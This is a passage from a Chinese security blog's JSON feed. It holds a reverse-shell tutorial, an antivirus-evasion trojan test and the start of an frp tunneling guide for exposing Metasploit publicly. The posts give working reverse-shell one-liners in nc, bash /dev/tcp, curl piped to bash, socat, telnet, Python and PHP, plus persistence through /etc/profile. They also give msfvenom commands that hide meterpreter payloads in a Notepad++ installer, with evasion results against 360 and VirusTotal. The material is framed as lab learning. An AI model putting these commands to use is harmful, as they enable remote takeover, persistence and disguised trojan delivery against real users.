/>\n&lt;br&gt;</li>\n</ul>\n</li>\n<li>虽然目标机中了招，但是目标机位于<strong>局域网</strong>，或 IP 会<strong>动态变化</strong>。\n<ul>\n<li>不能获得<strong>可用的 IP</strong> 地址</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"实现方式\"><a class=\"anchor\" href=\"#实现方式\">#</a> 实现方式</h1>\n<p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据 目标主机的<strong>环境</strong> 来确定，<br />\n比如：</p>\n<ul>\n<li>如果有 <strong>netcat</strong> 或者 <strong>Socat</strong> 或者 <strong>Telnet</strong> 工具，那么可以利用 <strong>任意这三者之一</strong> 反弹 shell，</li>\n<li>如果 <strong>bash</strong> 可用，那么可以利用 bash 反弹 shell，</li>\n<li>如果具有 <strong>python</strong> 或者 <strong>php</strong> 的环境，那么可以利用 <strong>这些语言的脚本</strong> 反弹 shell。</li>\n</ul>\n<h2 id=\"利用-netcat-反弹shell\"><a class=\"anchor\" href=\"#利用-netcat-反弹shell\">#</a> 利用 netcat 反弹 shell</h2>\n<p><strong>Netcat</strong>（即 <strong>nc</strong> ） 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它可以轻易的建立任何连接。</p>\n<h3 id=\"准备\"><a class=\"anchor\" href=\"#准备\">#</a> 准备：</h3>\n<p>目前，默认的各个 <strong>linux</strong> 发行版本已经自带了 <strong>netcat</strong> 工具包。</p>\n<p>但是有部分版本的 <strong>netcat</strong> 的 <strong>-e</strong> 功能 被阉割了<br />\n（大概是出于安全考虑，因为 <strong>-e</strong> 可以直接发布与反弹本地 <strong>shell</strong>）</p>\n<p>对于这种情况，需要<strong>手动下载安装包</strong>，命令如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://jaist.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class=\"line\">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class=\"line\">./configure</span><br><span class=\"line\">make &amp;&amp; make install</span><br><span class=\"line\">make clean</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"攻击机开启监听\"><a class=\"anchor\" href=\"#攻击机开启监听\">#</a> 攻击机开启监听：</h3>\n<blockquote>\n<p>格式： <code>nc -lvvp &lt;攻击机监听的端口&gt;</code></p>\n</blockquote>\n<p><code>netcat -lvvp 23333</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443777/Typera/2023/04/074dea0aeb65e3cf991579314a98284c.png\" alt=\"image-20230426012933906\" /></p>\n<h3 id=\"目标机主动连接攻击机\"><a class=\"anchor\" href=\"#目标机主动连接攻击机\">#</a> 目标机主动连接攻击机：</h3>\n<blockquote>\n<p>格式： <code>nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</code></p>\n</blockquote>\n<p><code>netcat 192.168.158.139 23333 -e /bin/bash</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443773/Typera/2023/04/f52bbdd3389beb7c7a9e9da72e220e40.png\" alt=\"image-20230426012929850\" /></p>\n<p>（<strong>必须</strong>攻击机<strong>先</strong>开始 <strong>监听</strong>，目标机<strong>再反弹 shell</strong>，这样才会有效果）</p>\n<p>成功反弹 shell：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443770/Typera/2023/04/9284a9b2e6290d96a8b65313b24f91a3.png\" alt=\"image-20230426012926374\" /></p>\n<h2 id=\"利用-bash-反弹-shell\"><a class=\"anchor\" href=\"#利用-bash-反弹-shell\">#</a> 利用 Bash 反弹 shell</h2>\n<p>使用 Bash 中 <strong>网络重定向</strong> 的方法</p>\n<h3 id=\"准备-2\"><a class=\"anchor\" href=\"#准备-2\">#</a> 准备：</h3>\n<p>Kali Linux 中使用的 <strong>Shell</strong> 是 <strong>zsh</strong>，<br />\n可以用命令： <code>echo %SHELL</code>  查看当前系统使用的 <strong>Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443763/Typera/2023/04/8d5285fdf9ee6db10ebba4ce645ad92c.png\" alt=\"image-20230426012919215\" /></p>\n<p>所以我们需要更换 Shell：</p>\n<ul>\n<li>更换： <code>chsh -s /bin/bash</code></li>\n<li>重启： <code>reboot</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443759/Typera/2023/04/a9c9ebe071eae7546dacb18ebc0bb277.png\" alt=\"image-20230426012915317\" /></li>\n</ul>\n<p><strong>[注意]：</strong> 出现下图错误只是因为 <strong>攻击机 没开监听</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443751/Typera/2023/04/8854676b35906672629c5fc26ad8a02f.png\" alt=\"image-20230426012907770\" /></p>\n<p>另外，Debian 中，部分版本可能默认<strong>没开</strong> bash 的 网络重定向 选项，</p>\n<p>对于这种情况，我们只能：加上 <code>--enable-net-redirections</code>  <strong>重新编译 bash</strong><br />\n 详见我的另一篇文章：<a href=\"\">【从源码重新编译 Bash：重定向功能】</a></p>\n<h3 id=\"命令\"><a class=\"anchor\" href=\"#命令\">#</a> 命令：</h3>\n<p>（攻击机<strong>事先</strong>开启 本地监听）</p>\n<blockquote>\n<p>格式： <code>bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</code></p>\n</blockquote>\n<p><code>bash -i &gt;&amp; /dev/tcp/192.168.158.139/23333 0&gt;&amp;1</code></p>\n<p><strong>成功反弹 shell：</strong><br />\n<strong>目标机</strong> 界面 (反弹)：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443746/Typera/2023/04/c693896f2e2fa73809cee178b0f6533b.png\" alt=\"image-20230426012903048\" /></p>\n<p><strong>攻击机</strong> 界面 (监听)：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443743/Typera/2023/04/6fb9f5e48c00f60ba91673a9f6c734eb.png\" alt=\"image-20230426012858851\" /></p>\n<h3 id=\"详细解释\"><a class=\"anchor\" href=\"#详细解释\">#</a> 详细解释：</h3>\n<ul>\n<li><code>bash -i</code>\n<ul>\n<li>产生一个 <strong>bash</strong> 交互环境。</li>\n</ul>\n</li>\n<li><code>&gt;&amp;</code>\n<ul>\n<li>把联合符号 前面 的内容与 后面 相结合，然后一起<strong>重定向</strong>给后者。</li>\n</ul>\n</li>\n<li><code>/dev/tcp/192.168.158.139/23333</code>\n<ul>\n<li><code>/dev/tcp/ip/port</code>  是 <strong>bash</strong> 中定义的一个方法，</li>\n<li>作用是：让攻击机 (192.168.158.139) 和目标机，在攻击机的 23333 端口上，建立一个 <strong>tcp</strong> 连接。</li>\n</ul>\n</li>\n<li><code>0&gt;&amp;1</code>\n<ul>\n<li>0、1 为<strong>文件描述符</strong>。</li>\n<li>即将 <strong>标准输入 (0)</strong> 与 <strong>标准输出 (1)</strong> 的内容相结合，然后<strong>重定向</strong>给前面 <strong>标准输出 (1)</strong> 的内容。（在反弹 shell 中实现 <strong>输入输出</strong> 的关键）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"curl-配合-bash\"><a class=\"anchor\" href=\"#curl-配合-bash\">#</a> Curl 配合 Bash</h3>\n<p>丰富一下用 Bash 反弹 Shell 的手段<br />\n（Curl 的命令借助了 Linux 中的管道）</p>\n<h4 id=\"1-准备-indexphp-文件\"><a class=\"anchor\" href=\"#1-准备-indexphp-文件\">#</a> 1. 准备 index.php 文件：</h4>\n<p>攻击机中创建  <code>index.php</code>  文件，<br />\n填写的<strong>内容</strong>为：直接使用  <code>Bash</code>  反弹 <strong>Shell</strong> 的情况下，目标机中运行的命令，即：</p>\n<blockquote>\n<p>bash -i &gt;&amp; /dev/tcp/192.168.158.139/23333 0&gt;&amp;1</p>\n</blockquote>\n<p><strong>存放</strong>在 <strong>web</strong> 目录下，<br />\n演示的 <strong>Kali Linux</strong> 虚拟机开启 <strong>Apache2</strong> 服务之后，对应目录为： <code>/var/www/html/</code></p>\n<p>开启 <strong>Apache2</strong> 服务之后，会在上述目录下生成一个  <code>index.php</code>  文件，<br />\n可以直接删去内容并 <strong>修改</strong>，该文件只是生成一个 <strong>web</strong> 页面而已（如下图）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443737/Typera/2023/04/97eb1b3565e6f8745bf100a9b5ee31ed.png\" alt=\"image-20230426012853268\" /></p>\n<h4 id=\"2-攻击机打开-23333-端口的监听\"><a class=\"anchor\" href=\"#2-攻击机打开-23333-端口的监听\">#</a> 2. 攻击机打开 23333 端口的监听</h4>\n<p>命令： <code>netcat -lvvp 23333</code></p>\n<h4 id=\"3-目标机输入-curl-命令反弹-shell\"><a class=\"anchor\" href=\"#3-目标机输入-curl-命令反弹-shell\">#</a> 3. 目标机输入 Curl 命令反弹 shell</h4>\n<p>命令： <code>curl 192.168.158.139|bash</code></p>\n<p>实现如图：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443723/Typera/2023/04/66bf859ff6c462a364624b51a215fd64.png\" alt=\"image-20230426012839981\" /></p>\n<p>成功反弹 <strong>Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443715/Typera/2023/04/01742775f569ce91fa25a5f8f25ed544.png\" alt=\"\" /></p>\n<h3 id=\"bash-反弹命令写入-etcprofile-文件\"><a class=\"anchor\" href=\"#bash-反弹命令写入-etcprofile-文件\">#</a> Bash 反弹命令写入 /etc/profile 文件</h3>\n<p>文件  <code>/etc/profile</code>  中的内容，会在 <strong>Bash</strong> 窗口打开时执行。</p>\n<h4 id=\"如图\"><a class=\"anchor\" href=\"#如图\">#</a> 如图：</h4>\n<blockquote>\n<p>（下图中我输入的是<strong>错误的代码</strong>，所以<strong>启动 Bash</strong> 之后，会<strong>输出报错</strong>内容到命令行）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443705/Typera/2023/04/92211d839dd171dc8f115e037f1e07eb.png\" alt=\"image-20230426012821415\" /><br />\n（如果是<strong>正确的代码</strong>，但是攻击侧<strong>没开监听</strong>，也会报错，如下图：）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443709/Typera/2023/04/566b0ca11a943f96d0bf550e848d84d4.png\" alt=\"image-20230426012825282\" /></p>\n</blockquote>\n<h4 id=\"布置的步骤\"><a class=\"anchor\" href=\"#布置的步骤\">#</a> 布置的步骤：</h4>\n<p>通过  <code>vim /etc/profile</code> ，编辑文件：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443699/Typera/2023/04/6a8db3c08c0188c7b0a9b1d25fed3c50.png\" alt=\"image-20230426012816962\" /><br />\n&lt;br&gt;</p>\n<ul>\n<li>在末尾添加代码： <code>/bin/bash -i &gt;&amp; /dev/tcp/192.168.158.139/23333 0&gt;&amp;1 &amp;</code></li>\n</ul>\n<blockquote>\n<p>该命令比直接反弹的代码在 <strong>末尾</strong> 多了一个 <strong>&amp;</strong>，<br />\n这是为了让打开 <strong>Bash</strong> 的用户能正常使用</p>\n</blockquote>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443696/Typera/2023/04/bf591833811a31c67bcfb2741ab7ca30.png\" alt=\"image-20230426012812596\" /></p>\n<p><strong>演示：</strong></p>\n<ul>\n<li>攻击机开始监听 23333 端口</li>\n<li><strong>Xshell</strong> 打开目标机的会话（即<strong>启动了 Bash</strong>）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443691/Typera/2023/04/1fe57f518c02b5c5651dc8fbfe3269c7.png\" alt=\"image-20230426012807425\" /></li>\n<li>没有回显，且攻击机<strong>成功 getshell</strong>，<strong>反弹成功</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443688/Typera/2023/04/5d329939a4e8d82c53c712f4b54adb09.png\" alt=\"image-20230426012804072\" /></li>\n</ul>\n<h2 id=\"利用-socat-反弹-shell\"><a class=\"anchor\" href=\"#利用-socat-反弹-shell\">#</a> 利用 Socat 反弹 Shell</h2>\n<p><strong>Socat</strong> 是 <strong>Linux</strong> 下一个多功能的网络工具，功能与 <strong>netcat (nc)</strong> 类似。<br />\n所以我们也可以使用 <strong>Socat</strong>，开监听、反弹 <strong>Shell</strong></p>\n<h3 id=\"下载-socat\"><a class=\"anchor\" href=\"#下载-socat\">#</a> 下载 Socat</h3>\n<p>试验之前，要先下载 <strong>Socat</strong>（<strong>Kali Linux</strong> 已经<strong>预装</strong>了该工具），<br />\n如果没有安装，使用命令： <code>apt-get install socat</code></p>\n<h3 id=\"攻击机开启监听-2\"><a class=\"anchor\" href=\"#攻击机开启监听-2\">#</a> 攻击机开启监听</h3>\n<p>命令： <code>socat TCP-LISTEN:23333 -</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443682/Typera/2023/04/f6ffc230be89565c17383bbe1e8262a3.png\" alt=\"image-20230426012759404\" /></p>\n<h3 id=\"目标机通过-socat-建立连接\"><a class=\"anchor\" href=\"#目标机通过-socat-建立连接\">#</a> 目标机通过 Socat 建立连接</h3>\n<p>命令： <code>socat tcp-connect:192.168.158.139:23333 exec:'bash -li',pty,stderr,setsid,sigint,sane</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443678/Typera/2023/04/00614ff7b3a1a2dfdfbad02dc0df8be1.png\" alt=\"image-20230426012754642\" /></p>\n<p><strong>成功</strong> 反弹 <strong>Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443674/Typera/2023/04/7b31e1aa07c5c4bdcbd9e6cafad1655a.png\" alt=\"image-20230426012750258\" /></p>\n<h2 id=\"利用-telnet-反弹-shell\"><a class=\"anchor\" href=\"#利用-telnet-反弹-shell\">#</a> 利用 Telnet 反弹 Shell</h2>\n<p>我们总会遇到，目标机 <strong>Netcat</strong> 和  <code>/dev/tcp/</code>  方法不可用的情况，<br />\n这时候如果 目标机配有 <strong>Telnet</strong> 服务，我们可以用 <strong>Telnet</strong> 建立反向连接。</p>\n<ul>\n<li>攻击机开启监听<br />\n（用 <strong>nc</strong> 或者 <strong>socat</strong> 都行）</li>\n<li>目标机执行命令，建立连接：<br />\n <code>mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443663/Typera/2023/04/db443fe2827a018ce3cb046f63793326.png\" alt=\"image-20230426012739427\" /></li>\n<li>成功获得 <strong>反弹 Shell</strong>：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443657/Typera/2023/04/d3d507d38eb37d836868b42d5f90db17.png\" alt=\"image-20230426012732507\" /></li>\n</ul>\n<h2 id=\"用-python-脚本反弹-shell\"><a class=\"anchor\" href=\"#用-python-脚本反弹-shell\">#</a> 用 Python 脚本反弹 Shell</h2>\n<p>使用 <strong>Python</strong> 的 <strong>socket</strong> 库</p>\n<p>攻击机开启监听后，直接使用命令：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.158.139&quot;,23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><br />\n（或者也可以转化成 .py 的 Python 文件，然后命令行执行）</p>\n<p>如下图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443651/Typera/2023/04/ff1cae7c81c0b04929f2c86b0e788c9e.png\" alt=\"image-20230426012727025\" /><br />\n 成功反弹 <strong>Shell</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443647/Typera/2023/04/6826b2f0cec7b82a3677a2e1e86de378.png\" alt=\"image-20230426012721830\" /></p>\n<h2 id=\"用-php-脚本反弹-shell\"><a class=\"anchor\" href=\"#用-php-脚本反弹-shell\">#</a> 用 php 脚本反弹 Shell</h2>\n<p>攻击侧开启监听，目标机执行的 php 脚本如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r &#x27;$sock=fsockopen(&quot;192.168.158.139&quot;,23333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><br />\n 实现如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443639/Typera/2023/04/fdd3929e8cec1fc5e67af1614f47d9b4.png\" alt=\"image-20230426012715771\" /><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682443627/Typera/2023/04/c830f507fd2cc729beb4e10b7a5d18cd.png\" alt=\"image-20230426012702683\" /></p>\n<h2 id=\"最后\"><a class=\"anchor\" href=\"#最后\">#</a> 最后</h2>\n<p>逐一实现了这么多的 <strong>反弹 Shell</strong> 的方法，我发现他们本质上都是一致的。</p>\n<p>无论是用工具还是脚本，都是 建立连接 + 输入输出重定向。</p>\n<p>总得来说，这样一遍下来，最开始读起来较为模糊的原理，现在也能够清晰地理解了。</p>\n",
            "tags": [
                "Linux",
                "Kali",
                "Reverse Shell"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E6%B5%8B%E8%AF%95/",
            "title": "免杀木马测试",
            "date_published": "2022-04-18T12:48:36.000Z",
            "content_html": "<div class=\"note default\">\n<p><strong>测试杀软：360 全家桶</strong></p>\n</div>\n<h2 id=\"msf\"><a class=\"anchor\" href=\"#msf\">#</a> MSF</h2>\n<p><code>msfconsole</code></p>\n<ul>\n<li>\n<p><strong>mp_npp:</strong>（2022/4/16）</p>\n<ul>\n<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x npp.8.1.4.Installer.exe -f exe &gt; mp_npp.exe</code> <br />\n&lt;br&gt;</li>\n<li><strong>监听</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/meterpreter/reverse_tcp</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>不能完全通过 <strong>静态扫描</strong>，快速扫描没事，指定文件夹扫描木马会报毒，且运行时会<strong>第一时间</strong>检测出木马</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>40 /  70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvYzNhN2MyMjgwZTRhYTlhYTA2OTM3MjkwNDlmN2Y4ZTBmZjA1ZTI1M2MxMDQ3ZWYyODI3NDhjMzUwOTY4NzIwNw==\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>mp_rc4_npp_i15：</strong>（2022/4/18）</p>\n<ul>\n<li><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 15 -f exe &gt; mp_rc4_npp_i15.exe</code> <br />\n&lt;br&gt;</li>\n<li><strong>监听</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/meterpreter/reverse_tcp_rc4</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>能过 <strong>360 静态检测</strong>，但会被 <strong>动态检测</strong> 查杀</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>38 /  70</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvODQzOTE0OTNkODJhNTg3OGYyYTJlYWE5NDY1ZTk1YjRlYWUwOWJjODQ4NmQ1MTRjYzE5YTc0MWIxOTE4NzIxYg==\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>sh_npp_i27：</strong>（2022/4/18）</p>\n<ul>\n<li><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.158.139 LPORT=4444 -e x86/shikata_ga_nai -x npp.8.1.4.Installer.exe -i 27 -f exe &gt; sh_npp_i27.exe</code> <br />\n&lt;br&gt;</li>\n<li><strong>监听</strong>：\n<ul>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set payload windows/shell_reverse_tcp_rc4</code></li>\n<li><code>set LHOST 192.168.158.139</code></li>\n<li><code>set LPORT 4444</code></li>\n<li><code>run</code></li>\n</ul>\n</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>能过 <strong>360 静态检测</strong>，但会被 <strong>动态检测</strong> 查杀</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>35 /  69</strong>）：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvMGE5NWQzOTBjODE2NWNmY2UxZGQ0Y2U0MDc2NGUyN2RiZmQ4OWJkMzk2YzZhMmE1OGFlNjYyZTYyM2FhNjIzMz9ub2NhY2hlPTE=\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"shellter-捆绑免杀\"><a class=\"anchor\" href=\"#shellter-捆绑免杀\">#</a> shellter 捆绑免杀</h2>\n<ul>\n<li><strong>shellter_npp：</strong>（2022/4/16）\n<ul>\n<li>payload 选择 <strong>shellter 自带</strong>的：Meterpreter_Reverse_TCP （选项 1）</li>\n<li><strong>免杀效果：</strong>\n<ul>\n<li>能过 <strong>360 静态检测</strong>，<strong>动态检测</strong> 报毒会有 <strong>大约一分钟</strong> 的延迟（时间上足够<strong>迁移进程</strong> +<strong> 布置后门</strong>）</li>\n<li><strong>virustotal</strong> 的检测情况（<strong>31 /  70</strong>）<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2ZpbGUvZTRlOTdiZWY4NWYzOTcwZDQyZTgxZDZmNzU4MTUwNTBkN2ZmMjM3MDc5MDg4OGZlOWQ3ODk0OGJjODNiMzBhNw==\">检测报告</span></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit",
                "shellter"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/frp-%E6%90%AD%E5%BB%BA%E5%85%AC%E7%BD%91-Metasploit/",
            "title": "frp 搭建公网 Metasploit",
            "date_published": "2022-04-18T12:18:36.000Z",
            "content_html": "<h2 id=\"准备\"><a class=\"anchor\" href=\"#准备\">#</a> 准备</h2>\n<ul>\n<li><strong>frps</strong> 部署机。\n<ul>\n<li>要求：拥有 <strong>公网 IP</strong> （例如 <strong>VPS</strong>、云服务器等等）</li>\n<li>本文选用 <strong>Ubuntu 18.04.6</strong> 云服务器</li>\n</ul>\n</li>\n<li><strong>frpc</strong> 客户机。\n<ul>\n<li>要求：能访问互联网</li>\n<li>本文选用 <strong>Kali Linux 2022</strong> 虚拟机</li>\n</ul>\n</li>\n<li><strong>frp</strong> 的 <strong>Github</strong> 项目地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==\">fatedier/frp</span></li>\n</ul>\n<h2 id=\"frps云服务器\"><a class=\"anchor\" href=\"#frps云服务器\">#</a> frps（云服务器）</h2>\n<h3 id=\"下载安装\"><a class=\"anchor\" href=\"#下载安装\">#</a> 下载安装</h3>\n<p><a href=\"https://github.com/fatedier/frp\"><strong>Github</strong> 项目</a> 上找到最新的 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==\">releases</span> ：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442796/Typera/2023/04/65c0edabf7c4cf7b431c9f10ff94bc05.png\" alt=\"image-20230426011312770\" /></p>\n<ol>\n<li>在 <strong>云服务器</strong> 终端上下载： <code>wget https://github.com/fatedier/frp/releases/download/v0.41.0/frp_0.41.0_linux_amd64.tar.gz</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442806/Typera/2023/04/d8b546285137f60d42fef4a27a06d821.png\" alt=\"image-20230426011322302\" /></li>\n<li><strong>解压缩</strong> 下载的文件： <code>tar -zxvf frp_0.41.0_linux_amd64.tar.gz</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442811/Typera/2023/04/4063a698f14734b0fb54a92974122ba5.png\" alt=\"image-20230426011327257\" /></li>\n<li><strong>进入</strong> 解压缩的文件夹： <code>cd frp_0.41.0_linux_amd64/</code></li>\n<li>因为配置的是 <strong>frps</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frpc</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frpc*</code> </strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442816/Typera/2023/04/f776553aeca109b5eef6a7e0d3d6bacd.png\" alt=\"image-20230426011332064\" /></li>\n</ol>\n<h3 id=\"编写-frps-配置文件\"><a class=\"anchor\" href=\"#编写-frps-配置文件\">#</a> 编写 frps 配置文件</h3>\n<p><code>vim frps.ini</code> <br />\n 内容如下：<br />\n（不想要<strong>监控页面</strong>的话，删除对应配置所在 <strong>行</strong> 即可）<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[common]</span><br><span class=\"line\">bind_port = 7777          # frps和frpc的通讯端口</span><br><span class=\"line\">dashboard_port = 9999     # web监控页面的端口</span><br><span class=\"line\">dashboard_user = Sycamore # 登录监控页面的用户名</span><br><span class=\"line\">dashboard_pwd = 123456    # 登录监控页面的密码</span><br></pre></td></tr></table></figure><br />\n 如图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442822/Typera/2023/04/02f8cca9459920e2f031c95fec4c172e.png\" alt=\"image-20230426011338410\" /><br />\n（需要 <strong>云服务器</strong> 打开 <strong>对应端口</strong>：7777、9999)</p>\n<h3 id=\"运行\"><a class=\"anchor\" href=\"#运行\">#</a> 运行</h3>\n<p>相关命令 <strong>基本上</strong> 应当在 <strong>frp_0.41.0_linux_amd64 文件夹</strong> 下执行～</p>\n<ul>\n<li>命令行输入： <code>./frps -c frps.ini</code>\n<ul>\n<li><strong>[注意]</strong>：关闭命令行窗口，或是停止执行该命令，就会 <strong>退出</strong></li>\n</ul>\n</li>\n<li>后台运行： <code>nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</code>\n<ul>\n<li>因为通常不会 <strong>关闭云服务器</strong>，所以 <strong>后台运行</strong> 就足够了；</li>\n<li>当然也可以 <strong>开启自启动</strong>，详情见 <strong>frpc</strong> 的内容，对应命令改个符号就行～</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"frpckali-虚拟机\"><a class=\"anchor\" href=\"#frpckali-虚拟机\">#</a> frpc（Kali 虚拟机）</h2>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442827/Typera/2023/04/692976286e5ddec8cd744326a1c3a54d.png\" alt=\"image-20230426011342973\" /></p>\n<h3 id=\"下载安装-2\"><a class=\"anchor\" href=\"#下载安装-2\">#</a> 下载安装</h3>\n<p><a href=\"https://github.com/fatedier/frp\"><strong>Github</strong> 项目</a> 上找到最新的 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9yZWxlYXNlcw==\">releases</span></p>\n<p>步骤与 <strong>frps</strong> 的几乎<strong>相同</strong>，<strong>区别</strong> 是：</p>\n<ul>\n<li>对象变成了 <strong>Kali 虚拟机</strong>，而不是 云服务器</li>\n<li>以及最后一步 <strong>删除的是 frps</strong>：<br />\n4. 因为配置的是 <strong>frpc</strong> ，可以 <strong>删除</strong> 文件夹内的 <strong>frps</strong> 相关文件，防止后续修改出错：<strong> <code>rm -rf frps*</code> </strong></li>\n</ul>\n<h3 id=\"编写-frpc-配置文件\"><a class=\"anchor\" href=\"#编写-frpc-配置文件\">#</a> 编写 frpc 配置文件</h3>\n<p>作为一款 <strong>内网穿透</strong> 工具，<strong>frp</strong> 穿透了内网之后，还需要使用 <strong>其他手段</strong>（<strong>ssh</strong>）<br />\n和外网建立交互，所以 <strong>配置文件</strong> 中会存在 <strong>[ssh]</strong> 